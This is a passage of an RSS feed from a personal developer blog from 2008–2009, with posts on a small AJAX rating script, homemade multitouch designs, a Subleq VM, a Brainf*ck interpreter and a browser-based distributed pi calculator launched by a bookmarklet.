_.ajax=_.X=&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(u,f,d,x)&lt;/span&gt;&lt;/span&gt;{x=&lt;span class=&quot;hljs-built_in&quot;&gt;window&lt;/span&gt;.ActiveXObject;x=&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt;(x?x:XMLHttpRequest)(&lt;span class=&quot;hljs-string&quot;&gt;'Microsoft.XMLHTTP'&lt;/span&gt;);x.open(d?&lt;span class=&quot;hljs-string&quot;&gt;'POST'&lt;/span&gt;:&lt;span class=&quot;hljs-string&quot;&gt;'GET'&lt;/span&gt;,u,&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;);x.setRequestHeader(&lt;span class=&quot;hljs-string&quot;&gt;'Content-type'&lt;/span&gt;,&lt;span class=&quot;hljs-string&quot;&gt;'application/x-www-form-urlencoded'&lt;/span&gt;);x.onreadystatechange=&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;{x.readyState&amp;gt;&lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;&amp;amp;amp;&amp;amp;amp;f?f(x.responseText,x):&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;};x.send(d)}
_.id=_.G=&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(e)&lt;/span&gt;&lt;/span&gt;{&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; e.style?e:_.d.getElementById(e)}
_.d=&lt;span class=&quot;hljs-built_in&quot;&gt;document&lt;/span&gt;

&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(ID)&lt;/span&gt;&lt;/span&gt;{
    _.ajax(&lt;span class=&quot;hljs-string&quot;&gt;&quot;?ratingplus&amp;amp;amp;id=&quot;&lt;/span&gt;+ID, &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;{
        _.G(&lt;span class=&quot;hljs-string&quot;&gt;&quot;rating&quot;&lt;/span&gt;+ID).innerHTML = &lt;span class=&quot;hljs-built_in&quot;&gt;parseInt&lt;/span&gt;(_.G(&lt;span class=&quot;hljs-string&quot;&gt;&quot;rating&quot;&lt;/span&gt;+ID).innerHTML)+&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;
    })
}
&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;minus&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(ID)&lt;/span&gt;&lt;/span&gt;{
    _.ajax(&lt;span class=&quot;hljs-string&quot;&gt;&quot;?ratingminus&amp;amp;amp;id=&quot;&lt;/span&gt;+ID, &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;{
        _.G(&lt;span class=&quot;hljs-string&quot;&gt;&quot;rating&quot;&lt;/span&gt;+ID).innerHTML = &lt;span class=&quot;hljs-built_in&quot;&gt;parseInt&lt;/span&gt;(_.G(&lt;span class=&quot;hljs-string&quot;&gt;&quot;rating&quot;&lt;/span&gt;+ID).innerHTML)-&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;
    })
}
&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I’ve packaged a sample rash template with the ajax functionality. You can get it here: &lt;a href=&quot;http://drop.io/ajaxrash&quot;&gt;http://drop.io/ajaxrash&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;And the purpose of this is of course for one of my new projects, BotBash a conversation repository between a little (really simple) bot i built and strangers on Omegle. You can see it in action on &lt;a href=&quot;http://botbash.antimatter15.com&quot;&gt;http://botbash.antimatter15.com&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>touch input device</title>
      <link>http://antimatter15.com/2009/06/touch-input-device/</link>
      <pubDate>Tue, 02 Jun 2009 05:53:16 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/06/touch-input-device/</guid>
      <author></author>
      <description>&lt;p&gt;Though what I described earlier is totally capable of Multitouch, I think it would probably be better to use a somewhat simpler implementation that is single-touch only.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Somewhat better distributed pi calculator</title>
      <link>http://antimatter15.com/2009/05/somewhat-better-distributed-pi-calculator/</link>
      <pubDate>Wed, 27 May 2009 03:32:16 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/05/somewhat-better-distributed-pi-calculator/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;http://distributed-pi.appspot.com/static/beta.html&quot;&gt;http://distributed-pi.appspot.com/static/beta.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;(Potential number of jobs is no longer theoretically finite)&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Good Web Host?</title>
      <link>http://antimatter15.com/2009/05/good-web-host/</link>
      <pubDate>Tue, 12 May 2009 03:25:51 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/05/good-web-host/</guid>
      <author></author>
      <description>&lt;p&gt;I think it’s probably better for me to move to a new web host, so I’m taking suggestions for good ones. It should be close to the $6 price range.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Run Brainf*ck... on your brain</title>
      <link>http://antimatter15.com/2009/04/run-brainf-ck-on-your-brain/</link>
      <pubDate>Thu, 16 Apr 2009 05:24:50 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/04/run-brainf-ck-on-your-brain/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;http://www.antimatter15.com/misc/bf.htm&quot;&gt;http://www.antimatter15.com/misc/bf.htm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;So I built this interesting brainf*ck interpreter which offloads most (not all) of the arithmetic operations (it concatenates tons of +1s into some more interesting operations). It could easily be made to offload all operations, but then it becomes a bit too prolonged and boring, so for +1s, and +0s, the computer handles the task.&lt;/p&gt;
&lt;p&gt;It’s fitted with a Hello World app, which takes quite a bit to start, but then it quickly types out the message.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Python Ports!</title>
      <link>http://antimatter15.com/2009/04/python-ports/</link>
      <pubDate>Sun, 12 Apr 2009 06:09:12 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/04/python-ports/</guid>
      <author></author>
      <description>&lt;p&gt;I’m porting the multitouch concept to python. Why? Because i’m on linux now, mono sucks, and PIL is pretty awesome.&lt;/p&gt;
&lt;p&gt;I’ve set up a mock-rig where there are 2 mirrors on the side angled by erasers with a crappy Creative NX webcam mounted on a textbook over it. It seems like the only practical use of this is for a multitouch-table sort because gravity makes it otherwise pretty hard to calibrate.&lt;/p&gt;
&lt;p&gt;So after I rewrite the software I need to try getting it to parse an actual image. Then I need to somehow hook it up to streaming webcam data, and somehow do something else.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Future updates to the Ajax Animator</title>
      <link>http://antimatter15.com/2009/04/future-updates-to-the-ajax-animator/</link>
      <pubDate>Sun, 12 Apr 2009 06:05:31 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/04/future-updates-to-the-ajax-animator/</guid>
      <author></author>
      <description>&lt;p&gt;okay, so recently something really awesome happened. Google App Engine will now support Java. The great thing about this, it that decent flash export may happen because of that (yay!) and possibly actionscript later on.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Experimental Ambient Light Parallel Reflection Optical Multitouch Overlay Proof-Of-Concept Implementation Version 2</title>
      <link>http://antimatter15.com/2009/03/experimental-ambient-light-parallel-reflection-optical-multitouch-overlay-proof-of-concept-implementation-version-2/</link>
      <pubDate>Sun, 22 Mar 2009 05:49:55 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/03/experimental-ambient-light-parallel-reflection-optical-multitouch-overlay-proof-of-concept-implementation-version-2/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2009/Experimental%20Ambient%20Light%20Parallel%20Reflection%20Optical%20Multitouch%20Overlay%20Proof-Of-Concept%20Implementation%20Version%202/multitouch-v2.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Multitouch PoC Software v2&lt;/div&gt;&lt;/div&gt;
With new Tri-detection system. Area Scan, Perimeter Scan, and Point Scan.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Idea for Mirror-Based Multitouch System</title>
      <link>http://antimatter15.com/2009/03/idea-for-mirror-based-multitouch-system/</link>
      <pubDate>Sat, 21 Mar 2009 08:06:56 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/03/idea-for-mirror-based-multitouch-system/</guid>
      <author></author>
      <description>&lt;p&gt;Early on, I recognized one of the biggest issues with my idea for using mirrors was the computational power necessary to run the finger-position-detection algorithm. I recently thought, that that would be totally superfluous.
My new idea is to use software to search a 1-pixel wide band of the mirrors to create several points. Those points are all combined to a list of all possible permutations. Each point goes through a method of determining whether or not it’s a fingertip. The easiest way, (and likely quite wildly inaccurate in the real world), is to measure the perimeter of a square that has that point of the center and compare it to the percent of that perimeter which is different from the surroundings. So then, you find the ones which work at all, and then you have your points!&lt;/p&gt;
&lt;p&gt;I actually made a rough proof-of-concept system for this. It uses a very crude method of determining the different blobs on the mirrors (contiguous same color). And it uses a very crude surrounding box perimeter-ratio system. It’s to serve as a proof-of-concept type thing, not necessarily the precursor to an actual program that does something along the lines of it.&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;Fast Multitouch Image Processing&quot;  src=&quot;/articles/2009/Idea%20for%20Mirror-Based%20Multitouch%20System/multitouch_concept.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Fast Multitouch Image Processing&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;As for how fast it is, i’m not sure. I don’t even know how things like touchlib do it. If they scan through every pixel, and do more processing, then this is easily 50x faster. The speed of this is very largely dependent on the number of fingers touching it. w+h+4bf^2 would be a rough approximation of how many pixels would be needed to processed to get the result (w = width resolution, h = height resolution, b = size of surrounding box, f = number of fingers). On the Proof-of-concept, the input data is 200x200, The box set to a width of 20px, and there are 3 fingers touching, meaning ~1120 pixels searched. And if you were to scan through all the pixels (as I originally thought the idea would require), it would be wh, or 200*200, or 40,000. So the speed increase is by a factor of 36x, which is totally awesome. But again, I don’t know how others do it, they may have already an even faster way. But last year, I made a sort of object-tracking thing, which worked by scanning every pixel, and it was able to work at quite decent speed. So this, being an order of magnitude faster should work better.&lt;/p&gt;
&lt;p&gt;Of course this is still a concept. There are still huge flaws not yet covered for like the fact in the real-world, the software would have to soemhow distinguish between the contents on the monitor and the hand in front. There may be a chance that someone is in an awkward position which tricks the software, the fact the software is completely  useless on just about anything other than a fingertip, and many many more. I still find it interesting anyway :P&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Subleq VM + Memory Visualizer</title>
      <link>http://antimatter15.com/2009/03/subleq-vm-memory-visualizer/</link>
      <pubDate>Wed, 18 Mar 2009 06:48:58 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/03/subleq-vm-memory-visualizer/</guid>
      <author></author>
      <description>&lt;p&gt;Subleq is a OISC, or one-instruction-set-computer. It’s turing complete, and implementing a VM for it is no more than possibly 10 lines of any code.&lt;/p&gt;
&lt;p&gt;I made a purtyful VM which displays the memory and colorizes real-time diffs against a real-time running program.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://antimatter15.110mb.com/misc/purtyleq.htm&quot;&gt;http://antimatter15.110mb.com/misc/purtyleq.htm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;it’s currently running
&lt;a href=&quot;http://99-bottles-of-beer.net/language-oisc-1395.html&quot;&gt;http://99-bottles-of-beer.net/language-oisc-1395.html&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>New Idea Insanely Cheap Multitouch</title>
      <link>http://antimatter15.com/2009/03/new-idea-insanely-cheap-multitouch/</link>
      <pubDate>Sat, 14 Mar 2009 06:31:24 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/03/new-idea-insanely-cheap-multitouch/</guid>
      <author></author>
      <description>&lt;p&gt;So I’ve been thinking about a new design for a Multitouch system. I’ve googled it a bit, and it seems original.&lt;/p&gt;
&lt;p&gt;Right now, there are a couple popular multitouch designs. The most popular one right now is probably FTIR, or Frustrated Total Internal Reflection. This is the one used by Jeff Han in his TED demonstrations. There are several variations of FTIR, like Diffused Surface Illumination. Then there is Diffused Illumination, which powers the Microsoft Surface, and a variation of DI is Front DI (where the light source is in front) like the simple DIY MTmini system (where the light source is ambient light). The problem with FTIR, DSI, and DI is that they require the camera to be in the back of the screen. This makes it impossible to retrofit a surface.&lt;/p&gt;
&lt;p&gt;The Wiimote tricks by Johnny Chung Lee aren’t exactly multitouch. They involve wearing special things to interact. They are interesting nonetheless, but not true multitouch. It’s virtually a completely different market, though the Wiimote IR camera may be used with the LaserTouch system theoretically instead of the camera (I was planning to try this out originally).&lt;/p&gt;
&lt;p&gt;Laser Light Plane, or LLP is usually similarly used as the ones above. A variant of LLP is the Microsoft Research LaserTouch system (apparently used in Touchwall as well). In LLP, a laser hooked up to a line generator creates a “plane” of infrared light only millimeters above the surface. When something interacts with that plane, light is scattered in all directions. Most systems take light from the bottom, but LaserTouch looks at the light from the top. Wherever your finger touches the plane, it appears to have something like a thin halo around it.&lt;/p&gt;
&lt;p&gt;LLP is interesting (especially the LaserTouch variant) because it allows for comparatively really cheap multitouch. The Aixiz 780nm 5-10mW laser (the one(s) most commonly used around nuigroup for LLP rigs). cost less than $10 (though normally 4 or so are used together, and buying goggles for protection from the dangerous light may cost close to a hundred, and the visible light filter is also a slight tax, along with disassembling a webcam to remove the IR filter, making it closer to the $100 estimate by microsoft).&lt;/p&gt;
&lt;p&gt;Well, I have a relatively simple idea. You just have a very thin mirror angled just right off to the side of the surface (actually, 2 mirrors, for two coordinates). You are probably thinking that this is only going to be like the normal single-touch systems, which suffer from not being able to detect where you actually pushed when there is multiple points. Actually, the mirrors are only used to determine whether you’ve contacted the screen yet. The position is determined by some magical image processing that hasn’t been implemented yet.&lt;/p&gt;
&lt;p&gt;So what do you think of this idea? Did I explain it enough? I’m probably gonna elaborate on this later.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Wiki</title>
      <link>http://antimatter15.com/2009/03/wiki/</link>
      <pubDate>Sat, 07 Mar 2009 06:26:37 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/03/wiki/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;http://antimatter15.110mb.com/wiki/&quot;&gt;http://antimatter15.110mb.com/wiki/&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Setting up a Wiki</title>
      <link>http://antimatter15.com/2009/03/setting-up-a-wiki/</link>
      <pubDate>Sat, 07 Mar 2009 05:56:11 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/03/setting-up-a-wiki/</guid>
      <author></author>
      <description>&lt;p&gt;Why? I donno. Wikis are awesome. I just want to see how the wiki concept could work for a site like this.&lt;/p&gt;
&lt;p&gt;It’s not going to replace my blog, but it may be used for some documentation and stuff&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Age</title>
      <link>http://antimatter15.com/2009/03/age/</link>
      <pubDate>Sat, 07 Mar 2009 05:44:08 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/03/age/</guid>
      <author></author>
      <description>&lt;p&gt;This is somewhat random, but i’m 13 years old. I started the ajax animator 2 years ago. I’ve always sorta kept my age somewhat secret, maybe out of paranoia. I still feel sorta awkward blogging about this now.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Safari 4 Beta</title>
      <link>http://antimatter15.com/2009/03/safari-4-beta/</link>
      <pubDate>Mon, 02 Mar 2009 01:23:48 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/03/safari-4-beta/</guid>
      <author></author>
      <description>&lt;p&gt;So I just tried Safari 4 Beta, and I’m quite impressed, but it’s strange that it’s almost exactly like Chrome. It’s like Chrome’s not only based on Webkit, but Webkit is based on chrome. Sorta like Vista = OS X, Gadgets/Widgets, Search/Spotlight stuff.
I’m somewhat annoyed about not being to close tabs with middle click, and how, unlike Firefox+TabKit, it only has that small possible tab space. Especially since I have a dysfunctional mental garbage-collection system, so I easily have &amp;gt;20 tabs at a time.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>I Fail</title>
      <link>http://antimatter15.com/2009/01/i-fail/</link>
      <pubDate>Mon, 26 Jan 2009 07:37:58 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/01/i-fail/</guid>
      <author></author>
      <description>&lt;p&gt;I Fail&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Flexible Plugin System</title>
      <link>http://antimatter15.com/2009/01/flexible-plugin-system/</link>
      <pubDate>Thu, 15 Jan 2009 06:28:18 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/01/flexible-plugin-system/</guid>
      <author></author>
      <description>&lt;p&gt;Basically, in modern CMS development, there are 2 types of plugin systems.  (that i care to talk about)
A) creating a comprehensive API and isolating plugins into a plugin directory (wordpress does this, AFIK)
B) creating patches to the source code through complex patching instructions (usually combined with an API too, and SMF sorta does this-ish)&lt;/p&gt;
&lt;p&gt;The problem, is that neither is really developer-friendly (or at least me-friendly). Learning an API is boring, and I see recognize code better than man-pages. Documentation also is normally pretty crappy anyway (except for big projects like WP/SMF). Patching source code makes you manually define the context, line number, etc. It’s usually using a non-standardized system (XML files) and has many merge conflicts.&lt;/p&gt;
&lt;p&gt;So how can it be improved? Well, the API part can’t really be improved on, but the latter one can. I think just hacking away directly at the source code is pretty decent. Because many times the changes are minor, and it doesn’t make sense to make huge new plugin files for it (though it would still work).&lt;/p&gt;
&lt;p&gt;Instead, imagine something similar to a SCM like CVS or Subversion. Use patches in standardized formats (GNU Diff Unified format), so people can resolve conflicts with familiar tools, and reduce the chance of it happening. Have the CMS include a “developer mode” which enables the system to intelligently find the edits and build patches for.&lt;/p&gt;
&lt;p&gt;What that becomes, is a simple, flexible pluggable, portable plugin system. (yay! a plugin subsystem as a plugin!).&lt;/p&gt;
&lt;p&gt;It’s really just to streamline the (B) type of plugin system.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>I'm A Wordpress Idiot</title>
      <link>http://antimatter15.com/2009/01/i-m-a-wordpress-idiot/</link>
      <pubDate>Sun, 04 Jan 2009 07:11:05 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/01/i-m-a-wordpress-idiot/</guid>
      <author></author>
      <description>&lt;p&gt;So in scribefire, i pressed “Save as Page” rather than “Save as Post” :(&lt;/p&gt;
</description>
    </item>
    <item>
      <title>I'm A Linux Idiot</title>
      <link>http://antimatter15.com/2009/01/i-m-a-linux-idiot/</link>
      <pubDate>Sun, 04 Jan 2009 07:10:10 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/01/i-m-a-linux-idiot/</guid>
      <author></author>
      <description>&lt;p&gt;So I needed to install phpMyAdmin, and having those epiphanies on how simple it is to install crap on Debian/Ubuntu, I typed in &lt;tt&gt;sudo apt-get install phpmyadmin&lt;/tt&gt; and it worked fine. Mapped out all the dependencies, installed them all, and then popped up a nice user-friendly config window where you select which server to install it in.
&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2009/I%27m%20A%20Linux%20Idiot/lamp4.gif&quot; &gt;&lt;/div&gt;
I had Apache2, so i just hit enter. Opened up my browser and went to /phpmyadmin. hmm. 404? tried /phpMyAdmin, and same.&lt;/p&gt;
&lt;p&gt;So I googled it, and there were all these success stories. I went and tried &lt;tt&gt;sudo dpkg-reconfigure phpmyadmin&lt;/tt&gt;, that same window popped up, this time i tabbed over to the ok button. and pressed enter. Checked again, still broken?&lt;/p&gt;
&lt;p&gt;So i found &lt;a href=&quot;http://www.flyninja.net/linux/installing-apache-php-mysql-lamp-phpmyadmin-ubuntu-710-gutsy-gibbon&quot;&gt;this guide&lt;/a&gt;, and it turns out you have to press space to select it -_-&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Feynman Point</title>
      <link>http://antimatter15.com/2009/01/feynman-point/</link>
      <pubDate>Sat, 03 Jan 2009 01:29:44 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/01/feynman-point/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;http://en.wikipedia.org/wiki/Feynman_point&quot;&gt;http://en.wikipedia.org/wiki/Feynman_point&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The pi calculator has reached the Feynman Point!&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Calculate Pi!</title>
      <link>http://antimatter15.com/2008/12/calculate-pi/</link>
      <pubDate>Wed, 31 Dec 2008 00:29:31 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/12/calculate-pi/</guid>
      <author></author>
      <description>&lt;p&gt;Press [this button]&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='javascript'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt;((&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(A)&lt;/span&gt;&lt;/span&gt;{&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; B=&lt;span class=&quot;hljs-built_in&quot;&gt;document&lt;/span&gt;.createElement(&lt;span class=&quot;hljs-string&quot;&gt;&quot;SCRIPT&quot;&lt;/span&gt;);B.type=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;;B.src=A;&lt;span class=&quot;hljs-built_in&quot;&gt;document&lt;/span&gt;.body.appendChild(B)})(&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.antimatter15.com/misc/pisect/pisect.js&quot;&lt;/span&gt;));
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt; &lt;small&gt;&lt;small&gt;&lt;small&gt;&lt;small&gt;&lt;small&gt;
 Please note that this is a distributed effort and there is no simple way to get the final value as of yet.&lt;/small&gt;&lt;/small&gt;&lt;/small&gt;&lt;/small&gt;&lt;/small&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Distributed Computing Take III</title>
      <link>http://antimatter15.com/2008/12/distributed-computing-take-iii/</link>
      <pubDate>Tue, 30 Dec 2008 23:19:10 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/12/distributed-computing-take-iii/</guid>
      <author></author>
      <description>&lt;p&gt;I donno why, but i’m revisiting this. I was trawling across Wikipedia one day, and I got to the article about Pi. I tried distributing Pi a while ago, actually, before I did the hashes. But I never ended up implementing it because it didn’t seem feasable, as all the algorithims I encountered (or tried porting) required lots of memory, something very hard to distribute for this scenario. But this time, I found &lt;a href=&quot;http://en.wikipedia.org/wiki/Computing_%C3%8F%C2%80#Digit_extraction_methods&quot;&gt;these&lt;/a&gt;. Looking through them, and googling in the process, I found &lt;a href=&quot;http://www.omegacoder.com/?p=91&quot;&gt;http://www.omegacoder.com/?p=91&lt;/a&gt;, and ported it over to Javascript. It was relatively slow compared to the SuperPi implementation in Javascript, but it was easily distributed.&lt;/p&gt;
&lt;p&gt;One problem though, is that it gets slower every iteration (to find the net block of digits). Finding .&lt;span style=&quot;font-size: small;&quot;&gt;141592653 will be roughly 20ms faster than the next 9 digits (it processes in blocks of 9). Not only would it take longer, but it occupied 100% of the CPU, and it would pop up that ever-annoying “This script may make your computer non responsive” window. So I implemented &lt;a href=&quot;http://www.julienlecomte.net/blog/2007/10/28/&quot;&gt;this&lt;/a&gt; pattern to make it not lock up any browser other than Chrome (and possibly WebKit Nightly).&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&quot;font-size: small;&quot;&gt;Still, it would take up 100% of the CPU. I ran it overnight and got to digit 17,000.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&quot;font-size: small;&quot;&gt;Eventually, it would take about half an hour for a single iteration (at the 20000th digit). With web-based distributed computing, I can’t rely much more time than what Google Analytics reports to be 00:02:24 (my Average Time on Site). And that’s half an hour with a 3ghz Intel Core 2 Duo (it’s dual core, but the script, is single threaded). &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&quot;font-size: small;&quot;&gt;I then split the function into smaller parts. the main function was split up, and the loops were divided across users. Now, it can scale easily. It uses virtually no visible CPU. and fits well into that 2 minute timeframe.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&quot;font-size: small;&quot;&gt;Try it out &lt;a href=&quot;http://www.antimatter15.com/misc/pisect/test.htm&quot;&gt;here&lt;/a&gt;, but don’t stay too long, because i only set there to be 500 “jobs”.
&lt;/span&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Action Limit Exceeded</title>
      <link>http://antimatter15.com/2008/12/action-limit-exceeded/</link>
      <pubDate>Mon, 29 Dec 2008 23:21:20 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/12/action-limit-exceeded/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;table style=&quot;margin: 20px 0px 0px; padding: 0px; width: 100%; border-collapse: separate;&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;tbody&gt;&lt;/p&gt;
&lt;p&gt;&lt;tr&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;width: 153px;&quot;&gt;&lt;a href=&quot;http://antimatter15.com/&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;Google&quot;  src=&quot;/articles/2008/Action%20Limit%20Exceeded/code_sm.png&quot; &gt;&lt;/div&gt;&lt;/a&gt;&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;padding-left: 0.8em;&quot;&gt;&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;white-space: nowrap; text-align: right;&quot;&gt;&lt;form style=&quot;margin: 0px; padding: 0px;&quot; action=&quot;/hosting/search&quot;&gt;&lt;/form&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&amp;nbsp;&lt;/p&gt;
&lt;div id=&quot;maincol&quot; style=&quot;padding: 3px; margin-top: 3px;&quot;&gt;

&lt;h3 id=&quot;action-limit-exceeded&quot;&gt;Action Limit Exceeded&lt;/h3&gt;
&lt;h4 id=&quot;what-happened-&quot;&gt;What happened?&lt;/h4&gt;
&lt;div style=&quot;margin-right: 25%;&quot;&gt;

&lt;p&gt;You have performed the requested action too many times in a 24-hour time period. Or, you have performed the requested action too many times since the creation of your account.&lt;/p&gt;
&lt;p&gt;We place limits on the number of actions that can be performed by each user in order to reduce the potential for abuse. We feel that we have set these limits high enough that legitimate use will very rarely reach them. Without these limits, a few abusive users could degrade the quality of this site for everyone.&lt;/p&gt;
&lt;p&gt;&lt;div style=&quot;margin: 2em;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;bubble_bg&quot; style=&quot;background-color: #c3d9ff; margin-bottom: 0.6em;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;div id=&quot;bub&quot; class=&quot;box-inner&quot; style=&quot;margin: 0px; padding: 0px 3px;&quot;&gt;&lt;strong&gt;Your options:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Wait 24 hours and then try this action again.&lt;/li&gt;
&lt;li&gt;Ask another member of your project to perform the action for you.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;mailto:google-code-hosting@googlegroups.com&quot;&gt;Contact us&lt;/a&gt;for further assistance.
&lt;/div&gt;
&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
Scary.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>3999 Spam</title>
      <link>http://antimatter15.com/2008/12/3999-spam/</link>
      <pubDate>Sat, 20 Dec 2008 06:02:34 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/12/3999-spam/</guid>
      <author></author>
      <description>&lt;p&gt;who’s the lucky spammer to post the 4000th spam?&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Wikify Format 2.0</title>
      <link>http://antimatter15.com/2008/12/wikify-format-2-0/</link>
